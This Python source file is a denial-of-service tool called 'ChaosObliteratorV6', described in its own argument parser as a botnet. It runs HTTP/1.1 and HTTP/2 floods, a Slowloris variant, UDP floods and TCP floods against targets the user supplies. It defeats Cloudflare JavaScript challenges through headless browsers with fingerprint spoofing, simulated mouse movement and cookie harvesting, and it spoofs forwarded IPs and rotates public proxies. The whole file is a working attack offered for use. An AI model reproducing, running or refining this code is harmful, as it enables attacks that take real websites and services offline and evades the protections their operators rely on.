import threading
import socket
import random
import string
import time
import argparse
import logging
import os
import hashlib
import xxhash
import h2.connection
import h2.events
import json
from typing import List
from playwright.sync_api import sync_playwright
import tls_client
import undetected_chromedriver as uc
import requests
from requests.cookies import RequestsCookieJar
import cloudscraper
import subprocess
import math
import urllib.parse
import sys
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("chaos_obliterator_v6.log"), logging.StreamHandler()]
)

class ChaosObliteratorV6:
    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None, proxy: str = None):
        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
        self.target_l4 = target_l4 if target_l4 else None
        self.duration = duration
        self.threads = min(threads, 60)  # Replit-optimized
        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
        self.end_time = time.time() + duration
        self.user_agents = [
            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
        ]
        self.success_count = {m: 0 for m in self.methods}
        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
        self.lock = threading.Lock()
        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        self.jitter_factors = {i: 1.0 for i in range(self.threads)}  # Per-thread jitter
        self.cookies = RequestsCookieJar()  # Upgraded to RequestsCookieJar
        self.session_headers = {}  # Store headers from browser
        self.cookie_file = "cookies.json"  # Store cookies for debugging
        self.screenshot_dir = "screenshots"  # Store screenshots for debugging
        self.proxy = proxy  # Single proxy
        self.proxy_pool = self._get_proxy_pool()  # Dynamic proxy pool
        os.makedirs(self.screenshot_dir, exist_ok=True)

    def _get_proxy_pool(self) -> List[str]:
        """Fetch proxy pool from proxyscrape API."""
        try:
            response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=all")
            proxies = response.text.splitlines()
            return [p for p in proxies if p]
        except:
            logging.warning("Failed to fetch proxy pool, using provided proxy or None.")
            return [self.proxy] if self.proxy else [None]

    def _random_payload(self, size: int = 512) -> bytes:
        """Upgraded polymorphic payload with larger size."""
        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
        hash1 = xxhash.xxh3_128(seed).digest()
        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
        return (hash4 + hash3 + hash2 + os.urandom(1))[:size]

    def _random_path(self) -> str:
        """Dynamic obfuscated URL paths."""
        prefixes = ["v14", "chaos", "obliterator", "nexus", "vortex"]
        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"

    def _random_ip(self) -> str:
        """Spoofed IP for headers."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self) -> dict:
        """Upgraded WAF-evading headers with cookie injection."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"'
        }
        headers.update(self.session_headers)
        if random.random() < 0.99:
            headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
        return headers

    def _save_cookies(self, cookies):
        """Save cookies to file for debugging with timestamp."""
        with open(self.cookie_file, "w") as f:
            json.dump({"timestamp": time.time(), "cookies": cookies}, f, indent=2)
        logging.info(f"Cookies saved to {self.cookie_file}")

    def _save_screenshot(self, page, attempt: int):
        """Save screenshot for debugging."""
        screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_attempt_{attempt}_{int(time.time())}.png")
        page.screenshot(path=screenshot_path)
        logging.info(f"Screenshot saved to {screenshot_path}")

    def _get_browser_session(self):
        """Use headless browser to bypass JS challenges with advanced emulation."""
        max_attempts = 3
        attempt = 0
        viewports = [
            {"width": 1920, "height": 1080},
            {"width": 1366, "height": 768},
            {"width": 1440, "height": 900}
        ]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool)
            try:
                cmd = ["xvfb-run", "--auto-servernum", "python3", "-c", "import playwright"]
                if os.system("command -v xvfb-run > /dev/null") == 0:
                    subprocess.run(cmd, check=True, capture_output=True)
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, proxy={"server": proxy} if proxy else None)
                    context = browser.new_context(
                        user_agent=random.choice(self.user_agents),
                        viewport=random.choice(viewports),
                        java_script_enabled=True,
                        ignore_https_errors=True
                    )
                    page = context.new_page()
                    
                    # Inject canvas/WebGL spoofing
                    page.evaluate("""
                        () => {
                            const getContext = HTMLCanvasElement.prototype.getContext;
                            HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
                                if (contextType === 'webgl' || contextType === 'webgl2') {
                                    const gl = getContext.call(this, contextType, attributes);
                                    const origGetParameter = gl.getParameter;
                                    gl.getParameter = function(parameter) {
                                        if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
                                            return 'WebGL Spoofed';
                                        }
                                        return origGetParameter.call(this, parameter);
                                    };
                                    return gl;
                                }
                                return getContext.call(this, contextType, attributes);
                            };
                        }
                    """)
                    
                    # Advanced human behavior emulation
                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded", timeout=30000)
                    time.sleep(random.uniform(1, 3))
                    
                    # Gradual scroll
                    for _ in range(3):
                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.2)")
                        time.sleep(random.uniform(0.3, 0.7))
                    
                    # Simulate Bezier curve mouse movement
                    for _ in range(4):
                        x_start = random.randint(100, 800)
                        y_start = random.randint(100, 600)
                        x_end = random.randint(100, 800)
                        y_end = random.randint(100, 600)
                        x_control1 = x_start + random.randint(-100, 100)
                        y_control1 = y_start + random.randint(-100, 100)
                        x_control2 = x_end + random.randint(-100, 100)
                        y_control2 = y_end + random.randint(-100, 100)
                        steps = 30
                        for t in range(steps + 1):
                            t = t / steps
                            x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                            y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                            page.mouse.move(x, y)
                            time.sleep(random.uniform(0.01, 0.03))
                    
                    # Simulate hover
                    if page.query_selector("a, button"):
                        page.query_selector("a, button").hover()
                        time.sleep(random.uniform(0.2, 0.5))
                    
                    page.mouse.click(random.randint(100, 800), random.randint(100, 600))  # Random click
                    time.sleep(random.uniform(0.5, 1.5))
                    page.keyboard.press("Tab")  # Simulate tab key
                    time.sleep(random.uniform(0.2, 0.8))
                    if page.query_selector("input[type='text']"):
                        page.fill("input[type='text']", ''.join(random.choices(string.ascii_letters, k=10)))
                        time.sleep(random.uniform(0.2, 0.5))
                    
                    # Check page status
                    response = page.evaluate("() => document.readyState")
                    if response != "complete":
                        logging.warning(f"Attempt {attempt + 1}: Page not fully loaded.")
                        self._save_screenshot(page, attempt + 1)
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Check HTTP status and response body
                    status = page.evaluate("() => window.performance.getEntriesByType('navigation')[0].responseStatus")
                    response_body = page.content()[:200]  # Log first 200 chars
                    if status in [403, 429]:
                        logging.warning(f"Attempt {attempt + 1}: HTTP {status} detected. Response: {response_body}")
                        self._save_screenshot(page, attempt + 1)
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Get cookies and validate
                    cookies = context.cookies()
                    cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                    cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                    if not (cf_clearance and cf_bm):
                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying... Response: {response_body}")
                        self._save_cookies(cookies)
                        self._save_screenshot(page, attempt + 1)
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Validate cookies with test request
                    test_headers = self._random_headers()
                    test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                    if test_response.status_code != 200:
                        logging.warning(f"Attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                        self._save_cookies(cookies)
                        self._save_screenshot(page, attempt + 1)
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Store cookies in RequestsCookieJar
                    for cookie in cookies:
                        self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                    
                    # Get headers from browser
                    self.session_headers = {
                        "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "document"
                    }
                    self._save_cookies(cookies)
                    browser.close()
                    logging.info("JS challenge passed, cookies obtained.")
                    return
            except Exception as e:
                logging.error(f"Playwright failed: {e}")
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to undetected_chromedriver fallback...")
                    self._get_browser_session_fallback()
        logging.error("Failed to get valid cookies after max attempts, trying cloudscraper...")
        self._get_browser_session_cloudscraper()

    def _get_browser_session_fallback(self):
        """Fallback to undetected_chromedriver with advanced emulation."""
        max_attempts = 3
        attempt = 0
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool)
            try:
                options = uc.ChromeOptions()
                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
                options.add_argument("--headless")
                if proxy:
                    options.add_argument(f"--proxy-server={proxy}")
                driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
                
                # Canvas/WebGL spoofing
                driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                    "source": """
                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                        const getContext = HTMLCanvasElement.prototype.getContext;
                        HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
                            if (contextType === 'webgl' || contextType === 'webgl2') {
                                const gl = getContext.call(this, contextType, attributes);
                                const origGetParameter = gl.getParameter;
                                gl.getParameter = function(parameter) {
                                    if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
                                        return 'WebGL Spoofed';
                                    }
                                    return origGetParameter.call(this, parameter);
                                };
                                return gl;
                            }
                            return getContext.call(this, contextType, attributes);
                        };
                    """
                })
                
                driver.get(f"https://{self.target_l7}")
                time.sleep(random.uniform(1, 3))
                
                # Gradual scroll
                for _ in range(3):
                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.2)")
                    time.sleep(random.uniform(0.3, 0.7))
                
                # Simulate Bezier curve mouse movement
                for _ in range(4):
                    x_start = random.randint(100, 800)
                    y_start = random.randint(100, 600)
                    x_end = random.randint(100, 800)
                    y_end = random.randint(100, 600)
                    x_control1 = x_start + random.randint(-100, 100)
                    y_control1 = y_start + random.randint(-100, 100)
                    x_control2 = x_end + random.randint(-100, 100)
                    y_control2 = y_end + random.randint(-100, 100)
                    steps = 30
                    for t in range(steps + 1):
                        t = t / steps
                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                        time.sleep(random.uniform(0.01, 0.03))
                
                # Simulate hover
                try:
                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
                time.sleep(random.uniform(0.3, 1))
                driver.execute_script("window.focus()")  # Simulate focus
                time.sleep(random.uniform(0.2, 0.8))
                
                # Simulate keyboard input
                try:
                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=10)))
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                # Get cookies and validate
                cookies = driver.get_cookies()
                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Fallback attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                    self._save_cookies(cookies)
                    attempt += 1
                    driver.quit()
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                if test_response.status_code != 200:
                    logging.error(f"Fallback attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                    self._save_cookies(cookies)
                    attempt += 1
                    driver.quit()
                    continue
                
                # Store cookies in RequestsCookieJar
                for cookie in cookies:
                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies)
                driver.quit()
                logging.info("Fallback: JS challenge passed, cookies obtained.")
                return
            except Exception as e:
                logging.error(f"Fallback failed: {e}")
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to selenium-stealth fallback...")
                    self._get_browser_session_selenium()
        logging.error("Fallback failed after max attempts.")

    def _get_browser_session_selenium(self):
        """Ultimate fallback using selenium-stealth."""
        max_attempts = 3
        attempt = 0
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool)
            try:
                options = Options()
                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
                options.add_argument("--headless")
                if proxy:
                    options.add_argument(f"--proxy-server={proxy}")
                driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
                stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform="Win32",
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                )
                
                driver.get(f"https://{self.target_l7}")
                time.sleep(random.uniform(1, 3))
                
                # Gradual scroll
                for _ in range(3):
                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.2)")
                    time.sleep(random.uniform(0.3, 0.7))
                
                # Simulate Bezier curve mouse movement
                for _ in range(4):
                    x_start = random.randint(100, 800)
                    y_start = random.randint(100, 600)
                    x_end = random.randint(100, 800)
                    y_end = random.randint(100, 600)
                    x_control1 = x_start + random.randint(-100, 100)
                    y_control1 = y_start + random.randint(-100, 100)
                    x_control2 = x_end + random.randint(-100, 100)
                    y_control2 = y_end + random.randint(-100, 100)
                    steps = 30
                    for t in range(steps + 1):
                        t = t / steps
                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                        time.sleep(random.uniform(0.01, 0.03))
                
                # Simulate hover
                try:
                    element = driver.find_element(By.CSS_SELECTOR, "a, button")
                    driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
                time.sleep(random.uniform(0.3, 1))
                driver.execute_script("window.focus()")  # Simulate focus
                time.sleep(random.uniform(0.2, 0.8))
                
                # Simulate keyboard input
                try:
                    driver.find_element(By.CSS_SELECTOR, "input[type='text']").send_keys(''.join(random.choices(string.ascii_letters, k=10)))
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                # Get cookies and validate
                cookies = driver.get_cookies()
                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Selenium attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                    self._save_cookies(cookies)
                    attempt += 1
                    driver.quit()
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                if test_response.status_code != 200:
                    logging.error(f"Selenium attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                    self._save_cookies(cookies)
                    attempt += 1
                    driver.quit()
                    continue
                
                # Store cookies in RequestsCookieJar
                for cookie in cookies:
                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies)
                driver.quit()
                logging.info("Selenium: JS challenge passed, cookies obtained.")
                return
            except Exception as e:
                logging.error(f"Selenium failed: {e}")
                attempt += 1
        logging.error("Selenium failed after max attempts.")

    def _get_browser_session_cloudscraper(self):
        """Ultimate fallback using cloudscraper."""
        try:
            scraper = cloudscraper.create_scraper()
            response = scraper.get(f"https://{self.target_l7}", proxies={"https": random.choice(self.proxy_pool)} if self.proxy_pool else None)
            cookies = response.cookies.get_dict()
            cf_clearance = "cf_clearance" in cookies
            cf_bm = "__cf_bm" in cookies
            if not (cf_clearance and cf_bm):
                logging.error(f"Cloudscraper failed: Missing cf_clearance or __cf_bm. Response: {response.text[:200]}")
                self._save_cookies(cookies)
                return
            
            # Validate cookies with test request
            test_headers = self._random_headers()
            test_headers["Cookie"] = "; ".join([f"{name}={value}" for name, value in cookies.items()])
            test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": random.choice(self.proxy_pool)} if self.proxy_pool else None, timeout=5)
            if test_response.status_code != 200:
                logging.error(f"Cloudscraper cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                self._save_cookies(cookies)
                return
            
            # Store cookies in RequestsCookieJar
            for name, value in cookies.items():
                self.cookies.set(name, value, domain=self.target_l7, path="/")
            
            self.session_headers = {
                "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Dest": "document"
            }
            self._save_cookies(cookies)
            logging.info("Cloudscraper: JS challenge passed, cookies obtained.")
        except Exception as e:
            logging.error(f"Cloudscraper failed: {e}")

    def _check_environment(self):
        """Check environment for dependencies."""
        try:
            import playwright
            logging.info(f"Playwright detected, version: {playwright.__version__}")
        except ImportError:
            logging.error("Playwright not installed. Run: pip3 install playwright")
            return False
        try:
            import tls_client
            logging.info(f"tls_client detected, version: {tls_client.__version__}")
        except ImportError:
            logging.error("tls_client not installed. Run: pip3 install tls-client")
            return False
        try:
            os.system("playwright install chromium > /dev/null 2>&1")
            logging.info("Chromium installed for Playwright.")
        except:
            logging.warning("Failed to install Chromium, fallback may be used.")
        if os.system("command -v xvfb-run > /dev/null") != 0:
            logging.warning("Xvfb not detected, installing...")
            os.system("sudo apt update && sudo apt install -y xvfb > /dev/null 2>&1")
            if os.system("command -v xvfb-run > /dev/null") == 0:
                logging.info("Xvfb installed successfully.")
            else:
                logging.warning("Xvfb installation failed, may fail in non-GUI environments.")
        return True

    def _refresh_cookies(self):
        """Refresh cookies every 10 seconds."""
        while time.time() < self.end_time:
            self._get_browser_session()
            time.sleep(10)

    def _scan_ports(self):
        """Dynamic port scanning for L4 targets."""
        if not self.target_l4:
            return
        new_ports = []
        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect((self.target_l4, port))
                new_ports.append(port)
                sock.close()
            except:
                pass
        if new_ports:
            with self.lock:
                self.active_ports = new_ports

    def _adjust_jitter(self, thread_id: int, response_time: float):
        """Per-thread adaptive jitter with Poisson distribution."""
        with self.lock:
            if response_time > 100:
                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.2, 2.0)
            elif response_time < 50:
                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.8, 0.5)
        return random.expovariate(1 / self.jitter_factors[thread_id])  # Poisson-based delay

    def _chaoshttp(self, thread_id: int):
        """Upgraded L7: HTTP flood with tls_client and H2 multiplexing."""
        if not self.target_l7:
            return
        session = tls_client.Session(
            client_identifier=f"chrome_{random.randint(124, 126)}",
            random_tls_extension_order=True
        )
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                proto = random.random()
                if proto < 0.5:  # HTTP/1.1 with browser cookies
                    headers = self._random_headers()
                    method = random.choice(["GET", "POST", "PUT"])
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    body = self._random_payload(512) if method in ["POST", "PUT"] else None
                    if method == "GET":
                        resp = session.get(url, headers=headers, proxy=random.choice(self.proxy_pool))
                    else:
                        resp = session.post(url, headers=headers, data=body, proxy=random.choice(self.proxy_pool))
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                else:  # HTTP/2 with multiplexing
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.015)
                    sock.connect((self.target_l7, 443))
                    context = ssl._create_unverified_context()
                    sock = context.wrap_socket(sock, server_hostname=self.target_l7)
                    h2conn = h2.connection.H2Connection()
                    h2conn.initiate_connection()
                    sock.sendall(h2conn.data_to_send())
                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
                    headers.update(self._random_headers())
                    for stream_id in range(1, 201, 2):  # Up to 100 streams
                        h2conn.send_headers(stream_id, headers, end_stream=True)
                        sock.sendall(h2conn.data_to_send())
                        time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                    with self.lock:
                        self.success_count["chaoshttp"] += 1
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                    sock.close()
                time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
            except Exception as e:
                logging.debug(f"ChaosHTTP error: {e}")
            finally:
                logging.debug(f"ChaosHTTP thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")

    def _ghostloris(self, thread_id: int):
        """Upgraded L7: Ghost Slowloris with tls_client."""
        if not self.target_l7:
            return
        try:
            session = tls_client.Session(
                client_identifier=f"chrome_{random.randint(124, 126)}",
                random_tls_extension_order=True
            )
            while time.time() < self.end_time:
                start_time = time.time()
                try:
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Forwarded-For": self._random_ip(),
                        "Connection": "keep-alive"
                    }
                    headers.update(self.session_headers)
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    session.get(url, headers=headers, timeout=0.08, proxy=random.choice(self.proxy_pool))  # Low timeout for slow drip
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["ghostloris"] += 1
                        self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                except Exception as e:
                    logging.debug(f"GhostLoris error: {e}")
                finally:
                    logging.debug(f"GhostLoris thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
        except Exception as e:
            logging.error(f"GhostLoris thread {thread_id} failed to initialize: {e}")

    def _udpchaos(self, thread_id: int):
        """L4: UDP chaos with larger payloads."""
        if not self.target_l4:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                port = random.choice(self.active_ports)
                payload = self._random_payload(1024)
                sock.sendto(payload, (self.target_l4, port))
                with self.lock:
                    self.success_count["udpchaos"] += 1
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"UDPChaos thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
        sock.close()

    def _tcpobliterator(self, thread_id: int):
        """L4: TCP obliterator with larger payloads."""
        if not self.target_l4:
            return
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.015)
                port = random.choice(self.active_ports)
                sock.connect((self.target_l4, port))
                sock.send(self._random_payload(512))
                with self.lock:
                    self.success_count["tcpobliterator"] += 1
                sock.close()
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"TCPObliterator thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")

    def start(self):
        """Unleash the upgraded chaos obliterator."""
        if not self.target_l7 and not self.target_l4:
            logging.error("At least one target (L7 or L4) required")
            return
        logging.info(f"ChaosObliteratorV6 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy pool: {len(self.proxy_pool)} proxies")
        
        # Check environment
        if not self._check_environment():
            logging.error("Environment check failed, exiting.")
            return
        
        # Start cookie refresh thread
        if self.target_l7:
            threading.Thread(target=self._refresh_cookies, daemon=True).start()
            time.sleep(5)  # Wait for initial cookies
        
        # Start port scanning for L4
        if self.target_l4:
            threading.Thread(target=self._scan_ports, daemon=True).start()
            time.sleep(0.3)
        
        # Split workers: crawler (browser) and flooder
        threads = []
        method_funcs = {
            "chaoshttp": self._chaoshttp,
            "ghostloris": self._ghostloris,
            "udpchaos": self._udpchaos,
            "tcpobliterator": self._tcpobliterator
        }
        try:
            for method in self.methods:
                if method in method_funcs:
                    for i in range(self.threads // len(self.methods)):
                        t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                        threads.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            logging.info("Received KeyboardInterrupt, shutting down gracefully...")
        finally:
            avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
            logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")

def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy: str):
    methods = methods.split(",")
    obliterator = ChaosObliteratorV6(target_l7, target_l4, duration, methods=methods, proxy=proxy)
    obliterator.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosObliteratorV6 Botnet")
    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
    parser.add_argument("--proxy", type=str, default=None, help="Proxy (e.g., http://user:pass@host:port or socks5://host:port)")
    args = parser.parse_args()
    main(args.target_l7, args.target_l4, args.duration, args.methods, args.proxy)
